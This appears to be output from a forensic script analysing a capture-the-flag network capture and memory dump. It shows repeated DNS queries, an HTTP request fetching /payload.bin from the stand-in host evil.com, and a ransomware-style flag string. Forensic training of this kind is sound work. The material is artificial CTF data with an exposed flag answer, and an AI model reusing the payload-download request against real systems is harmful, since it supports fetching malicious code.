============================================================
PCAP ANALYSIS
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.
  Query: update.windows.com.

--- DNS Answers ---

--- TCP Connections ---
  10.98.0.5:20 -> 93.184.216.34:80
  93.184.216.34:80 -> 127.0.0.1:80

--- UDP Connections ---
  10.98.0.5:53 -> 8.8.8.8:53

--- ICMP Packets ---
  Total ICMP packets: 0

--- Sample Raw Payloads (first 20) ---
  [TCP 20->80] len=45: 474554202f7061796c6f61642e62696e20485454502f312e310d0a486f73743a206576696c2e636f6d0d0a0d0a
    ASCII: b'GET /payload.bin HTTP/1.1\r\nHost: evil.com\r\n\r\n'
  [TCP 80->80] len=103: 485454502f312e3120323030204f4b0d0a436f6e74656e742d4c656e6774683a2036340d0a0d0af184376b295ff909723748c7865e7e623ba4bb0bbde13f3c131faafdaff3aef6651197dc76d110067d
    ASCII: b'HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\n\xf1\x847k)_\xf9\tr7H\xc7\x86^~b;\xa4\xbb\x0b\xbd\xe1?<\x13\x1f\xaa\xfd\xaf\xf3\xae\xf6e\x11\x97\xdcv\xd1\x10\x06}'

============================================================
MEMORY DUMP ANALYSIS
============================================================
Memory dump size: 2097152 bytes

--- Interesting Strings in Memory Dump ---
Total printable strings (len>=6): 3497
  c]SZK$
  {}w`}'
  cH=HPM
  cLE]7Y
  .E*qHS
  #d]Za,
  6<i"YA
  qo,~NY
  dndCz'
  7ckxr$
  >& pXK
  I`>j?n0
  48a6]-
  #me]8$T
  ]gS(|xN=
  ":?B~&
  Aym}pN
  yo46L)
  0b)4t-
  qK(w'E
  $gKtoB
  Rc_499]D
  ,%Ej:J
  T6wta#o
  Jxd~ce|nZ
  HllT,a
  P19RKUt*
  a~'_i}6
  }7S(?:
  C4[3}N
  !#4t>V
  P.z$2.
  /yDPa.#
  ]${?lv
  FE#&,l`qc
  a>Bk`3
  eZ\5=zY
  &MG'dE
  ~C!&-m
  2_6/N>[D_
  0n^]pu
  [xzge5qz
  Ks)_t#
  4I+!b7
  #Wb_L9
  5kOH&g
  =nTUX-
  jpl(<1
  |.,I2l
  ;a%2@X

--- Searching for key patterns ---
  Found 'MythX' at positions: [1688900]
    Context: b'LES ARE ENCRYPTED!!\x00MythX{m3m0ry_r4ns0mw4r3_d3c0y}\x00\x8c\n\x9c\x98X\x85\x15\x00\n\x9d\nJV\xeb'

--- Memory dump section entropy ---
  Chunk 0: offset 0x0, entropy=7.9985
  Chunk 1: offset 0x20000, entropy=7.9986
  Chunk 2: offset 0x40000, entropy=7.9986
  Chunk 3: offset 0x60000, entropy=7.9987
  Chunk 4: offset 0x80000, entropy=7.9985
  Chunk 5: offset 0xa0000, entropy=7.9985
  Chunk 6: offset 0xc0000, entropy=7.9987
  Chunk 7: offset 0xe0000, entropy=7.9985
  Chunk 8: offset 0x100000, entropy=7.9982
  Chunk 9: offset 0x120000, entropy=7.9987
  Chunk 10: offset 0x140000, entropy=7.9986
  Chunk 11: offset 0x160000, entropy=7.9985
  Chunk 12: offset 0x180000, entropy=7.9986
  Chunk 13: offset 0x1a0000, entropy=7.9988
  Chunk 14: offset 0x1c0000, entropy=7.9983
  Chunk 15: offset 0x1e0000, entropy=7.9988
